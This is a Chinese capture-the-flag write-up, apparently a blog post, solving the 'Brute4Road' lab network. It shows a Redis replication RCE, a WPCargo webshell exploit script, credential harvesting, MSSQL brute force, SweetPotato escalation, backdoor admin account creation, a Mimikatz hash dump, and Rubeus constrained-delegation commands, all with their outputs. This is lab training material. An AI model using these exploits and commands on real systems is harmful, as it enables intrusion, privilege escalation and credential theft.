3import requests 4 5# This is a magic string that when treated as pixels and compressed using the png 6# algorithm, will cause \u003c?=$_GET[1]($_POST[2]);?\u003e to be written to the png file 7payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50' 8 9def encode_character_code(c: int): 10 return '{:08b}'.format(c).replace('0', 'x') 11 12text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:] 13 14destination_url = 'http://127.0.0.1:8001/' 15cmd = 'ls' 16 17# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels. 18requests.get( 19 f\"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}\u0026sizefactor=.090909090909\u0026size=1\u0026filepath=/var/www/html/webshell.php\" 20) 21 22# We have uploaded a webshell - now let's use it to execute a command. 23print(requests.post( 24 f\"{destination_url}webshell.php?1=system\", data={\"2\": cmd} 25).content.decode('ascii', 'ignore')) 成功RCE，用户是www-data\n但是靶机不出网，没办法上线\n那就直接用蚁剑连\n在wordpress的配置文件中找到数据库的账号密码\n1// ** Database settings - You can get this info from your web host ** // 2/** The name of the database for WordPress */ 3define( 'DB_NAME', 'wordpress' ); 4 5/** Database username */ 6define( 'DB_USER', 'wpuser' ); 7 8/** Database password */ 9define( 'DB_PASSWORD', 'WpuserEha8Fgj9' ); 10 11/** Database hostname */ 12define( 'DB_HOST', '127.0.0.1' ); 13 14/** Database charset to use in creating database tables. */ 15define( 'DB_CHARSET', 'utf8mb4' ); 16 17/** The database collate type. Don't change this if in doubt. */ 18define( 'DB_COLLATE', '' ); wpuser/WpuserEha8Fgj9 这个机子不对外开放端口，所以我们直接用webshell管理器上的数据库管理工具连\n拿到第二个flag\nflag{c757e423-eb44-459c-9c63-7625009910d8} FLAG3 在表S0meth1ng_y0u_m1ght_1ntereSted有一堆密码\n不知道有什么用，先导出来\n注意这里用蚁剑导出之前记得将limit去掉，不然密码不全\n172.22.2.16上有mssql服务\nNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 用我们手上的这堆密码爆破一下\n成功拿到账号密码\nsa/ElGNkOiC 接下来直接用mdut连\n拿到nt service\\mssqlserver权限\n没找到flag，猜测需要提权。\n可以用SweetPotato提权\nC:/Users/Public/sweetpotato.exe -a \"whoami\" 拿到第三个flag\n=====================================\r8\"\"\"\"8 88 8\"\"\"8 8 8 eeee\re e e eeeee eeee 88 8 8 eeeee eeeee eeeee 8eeee8ee 8 8 8 8 8 8 88 88 8eee8e 8 88 8 8 8 8 88 8 8eee8e 8e 8 8e 8eee 88ee88 88 8 8 8 8eee8 8e 8 88 8 88 8 88 8 88 88 88 88 8 8 8 88 8 88 8 88eeeee8 88 8 88ee8 88 88ee 88 88 8 8eee8 88 8 88ee8 flag03: flag{6fc1b639-d71c-4c8b-9747-e29074e05a7e} FLAG4 新建一个用户用rdp连上去\nnet user xrntkk Abc123456 /add\rnet localgroup administrators xrntkk /add\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 信息收集一下\n发现这台机子在域内\n用bloodhound做一下信息收集\nchu0的图，偷过来了![undefined (1)](../assets/undefined (1).png)\n从图中我们可以看到，MSSQLSERVER 具有对 DC 的约束性委派权限\n我们可以尝试进行约束性委派攻击\n什么是约束性委派？ 原理大致如下，参考文章：\nhttps://xz.aliyun.com/news/13854\n所以我们接下来就要尝试用mimikatz抓取hash，然后申请TGT，最后伪造S4U请求访问DC\n先传一个mimikatz.exe，管理员打开\nlog\rprivilege::Debug sekurlsa::logonpasswords exit 抓到一个用户hash\nAuthentication Id : 0 ; 95385 (00000000:00017499)\rSession : Service from 0\rUser Name : ReportServer\rDomain : NT Service\rLogon Server : (null)\rLogon Time : 2025/3/17 19:28:19\rSID : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051\rmsv :\t[00000003] Primary\r* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* NTLM : 7e7c2b7d5cbee13683f637e721e4a147\r* SHA1 : d112e5ca3e3c502539058a39f153b432642aec96\rtspkg :\twdigest :\t* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* Password : (null)\rkerberos :\t* Username : MSSQLSERVER$\r* Domain : xiaorang.lab\r* Password : 6c 8f 64 88 42 1e e5 dc ea 08 1f 03 05 9b e4 a5 50 70 b8 74 77 7b 50 b1 1e 80 d5 4b 0e 79 7c 9b b6 75 53 56 49 19 66 72 a9 d3 50 f8 d3 ab 0e bd e3 14 96 72 a5 fb b5 3f dc d9 ce 37 91 a2 5f d6 a1 2c 39 ea dc f3 80 e6 d2 cd c0 e6 f2 45 cd d1 80 aa f2 7f 47 09 44 ca 7d aa a0 10 c8 3c 5e e0 ae 71 77 f4 f3 1b 13 88 ab 39 68 37 41 43 e0 45 eb 6c 2d f6 fd 67 c6 ac 67 3e dd 56 71 48 b2 ed 7a f8 8c 4f d6 30 67 a2 32 8f 05 a0 2e 65 05 ce af 7d a6 c2 8e d9 c9 fc 31 6b 8e a1 7f 95 0a 2b 68 88 db 11 d9 9c f5 af 68 8c 0e ac 03 93 79 07 59 dd e6 da 42 2c 72 55 8d 3d 35 a9 85 49 90 3f 7b fb 7d b2 72 f7 76 7e ba c5 f0 98 77 fa 18 b2 b4 7c 65 d2 84 b7 8b e3 b2 fe bf 00 92 24 3b 9c b2 98 d3 5b 82 d4 d1 9f b5 aa c9 3b 54 33 26 34 ssp :\tcredman :\t先用这个账号申请一个TGT\nRubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap \u003e TGT.txt 结果\n______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___)\r| | \\ \\| |_| | |_) ) ____| |_| |___ |\r|_| |_|____/|____/|_____)____/(___/\rv2.3.2 [*] Action: Ask TGT\r[*] Using rc4_hmac hash: 7e7c2b7d5cbee13683f637e721e4a147\r[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\\MSSQLSERVER$'\r[*] Using domain controller: 172.22.2.3:88\r[+] TGT request successful!\r[*] base64(ticket.kirbi):\rdoIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==\rServiceName : krbtgt/xiaorang.lab\rServiceRealm : XIAORANG.LAB\rUserName : MSSQLSERVER$ (NT_PRINCIPAL)\rUserRealm : XIAORANG.LAB\rStartTime : 2025/3/17 23:24:57\rEndTime : 2025/3/18 9:24:57\rRenewTill : 2025/3/24 23:24:57\rFlags : name_canonicalize, pre_authent, initial, renewable, forwardable\rKeyType : rc4_hmac\rBase64(key) : gifE8e2s2Hg361IDstjCZA==\rASREP (key) : 7E7C2B7D5CBEE13683F637E721E4A147 得到base64编码的TGT票据，利用Rubeus导入票据\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== 接下来就可以和DC进行通讯了\nWIN+R\r\\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\ 或者\ntype \\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\flag04.txt ######: ### ######: ##\r####### ## :### ####### ##\r## :## ## .#### ## :## ##\r## ## ##.#### ## ## ####### .####: ##.## ## ## .####. :#### :###.##\r## :## ####### ## ## ####### .######: :#: ## ## :## .######. ###### :#######\r#######. ###. ## ## ## ##: :## .## ## #######: ### ### #: :## ### ###\r#######. ## ## ## ## ######## ## ## ###### ##. .## :##### ##. .##\r## :## ## ## ## ## ######## ######## ## ##. ## ## .####### ## ##\r## ## ## ## ## ## ## ######## ## ## ##. .## ## . ## ##. .##\r## :## ## ##: ### ##. ###. :# ## ## :## ### ### ##: ### ### ###\r######## ## ####### ##### .####### ## ## ##: .######. ######## :#######\r###### ## ###.## .#### .#####: ## ## ### .####. ###.## :###.##\rWell done hacking!\rThis is the final flag, you deserve it!\rflag04: flag{1c3cf693-f2fc-4f35-aece-789e66f56ecc} ",
+  "wordCount" : "4420",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-17T22:02:55+08:00",
+  "dateModified": "2025-03-17T22:02:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      春秋云镜-Brute4Road-Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-03-17 22:02:55 +0800 CST'>2025-03-17</span>&nbsp;·&nbsp;9 分钟&nbsp;·&nbsp;Xrntkk
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#flag1" aria-label="FLAG1">FLAG1</a></li>
+                <li>
+                    <a href="#flag2" aria-label="FLAG2">FLAG2</a></li>
+                <li>
+                    <a href="#flag3" aria-label="FLAG3">FLAG3</a></li>
+                <li>
+                    <a href="#flag4" aria-label="FLAG4">FLAG4</a><ul>
+                        
+                <li>
+                    <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be" aria-label="什么是约束性委派？">什么是约束性委派？</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>参考文章</p>
+<blockquote>
+<p><a href="https://bowuchuling.github.io/posts/chunqiuBrute4Road.html">https://bowuchuling.github.io/posts/chunqiuBrute4Road.html</a></p>
+<p><a href="https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83">https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83</a></p>
+<p><a href="https://xz.aliyun.com/news/12189#toc-6">文章 - 浅谈约束委派攻击 - 先知社区</a></p></blockquote>
+<h3 id="flag1">FLAG1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h3>
+<p>拿到靶机先用fscan扫一扫</p>
+<pre tabindex="0"><code>┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1
+[2025-03-17 14:12:55] [INFO] 开始信息扫描
+[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1
+[2025-03-17 14:12:55] [INFO] 开始主机扫描
+[2025-03-17 14:12:55] [INFO] 有效端口数量: 233
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21
+[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
+[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
+[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =&gt; [http] 版本:1.20.1 产品:nginx
+[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store
+[2025-03-17 14:13:06] [INFO] 存活端口数量: 4
+[2025-03-17 14:13:06] [INFO] 开始漏洞扫描
+[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle
+[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207      状态码:200 长度:4833   标题:Welcome to CentOS
+[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!
+[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb
+[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379
+[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5
+</code></pre><p>发现redis不需要密码</p>
+<p>那我们连上去</p>
+<p><img alt="image-20250317141531955" loading="lazy" src="../assets/image-20250317141531955.png"></p>
+<p>redis未授权拿shell的常见利用方法有写webshell，写corn或者写sshkey</p>
+<p>这里我先尝试了写corn</p>
+<p><img alt="image-20250317142526810" loading="lazy" src="../assets/image-20250317142526810.png"></p>
+<p>发现没权限</p>
+<p>那同样的也没办法写sshkey</p>
+<p><img alt="image-20250317143311383" loading="lazy" src="../assets/image-20250317143311383.png"></p>
+<p>看到redis版本为5.0.12</p>
+<p>可以打redis主从复制（4.x~5.0.5）</p>
+<p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧 - Bypass - 博客园</a></p>
+<p>生成恶意so文件</p>
+<pre tabindex="0"><code>git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+cd RedisModules-ExecuteCommand/
+make
+</code></pre><p>自动化攻击脚本</p>
+<pre tabindex="0"><code>git clone https://github.com/Ridter/redis-rce.git
+cd redis-rce/
+cp ../RedisModules-ExecuteCommand/src/module.so ./
+pip install -r requirements.txt 
+python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so
+//python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so
+</code></pre><p><img alt="image-20250317144701781" loading="lazy" src="../assets/image-20250317144701781.png"></p>
+<p>拿到shell之后先上个线</p>
+<p><img alt="image-20250317145522117" loading="lazy" src="../assets/image-20250317145522117.png"></p>
+<pre tabindex="0"><code>/home/redis/flag/flag01
+</code></pre><p>读flag发现没有权限</p>
+<p>尝试suid提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">/usr/sbin/pam_timestamp_check
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">/usr/sbin/usernetctl
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">/usr/sbin/unix_chkpwd
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">/usr/bin/at
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">/usr/bin/chage
+</span></span><span class="line"><span class="ln">10</span><span class="cl">/usr/bin/base64
+</span></span><span class="line"><span class="ln">11</span><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="ln">12</span><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="ln">13</span><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="ln">14</span><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="ln">15</span><span class="cl">/usr/bin/crontab
+</span></span><span class="line"><span class="ln">16</span><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="ln">17</span><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="ln">18</span><span class="cl">/usr/bin/pkexec
+</span></span><span class="line"><span class="ln">19</span><span class="cl">/usr/libexec/dbus-1/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="ln">20</span><span class="cl">/usr/lib/polkit-1/polkit-agent-helper-1
+</span></span></code></pre></div><p>base64可以提权，但是只能读文件</p>
+<p><img alt="image-20250317145341222" loading="lazy" src="../assets/image-20250317145341222.png"></p>
+<pre tabindex="0"><code>base64 &#34;/home/redis/flag/flag01&#34; | base64 --decode
+</code></pre><pre tabindex="0"><code>[redis@centos-web01 tmp]$ base64 &#34;/home/redis/flag/flag01&#34; | base64 --decode
+ ██████                    ██              ██  ███████                           ██
+░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██
+░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██
+░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████
+░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██
+░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██
+░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████
+░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░ 
+
+
+flag01: flag{b16a2a4f-87b9-404c-8989-3ac8eac58ae2}
+
+Congratulations! ! !
+Guess where is the second flag?
+</code></pre><p>拿到第一个flag</p>
+<h3 id="flag2">FLAG2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h3>
+<p>信息收集一下</p>
+<p>看一下ip</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">[redis@centos-web01 tmp]$ ip addr show
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">1<span class="p">:</span> <span class="nl">lo</span><span class="c1">: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    inet 127.0.0.1/8 scope host lo
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    inet6 ::1/128 scope host 
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">2<span class="p">:</span> <span class="nl">eth0</span><span class="c1">: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    link/ether 00:16:3e:1a:f1:ec brd ff:ff:ff:ff:ff:ff
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0
+</span></span><span class="line"><span class="ln">11</span><span class="cl">       valid_lft 315356573sec preferred_lft 315356573sec
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    inet6 fe80::216:3eff:fe1a:f1ec/64 scope link 
+</span></span><span class="line"><span class="ln">13</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>fscan扫一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">  1</span><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ ./fscan -h 172.22.2.7/24 -nobr
+</span></span><span class="line"><span class="ln">  2</span><span class="cl">┌──────────────────────────────────────────────┐
+</span></span><span class="line"><span class="ln">  3</span><span class="cl">│    ___                              _        │
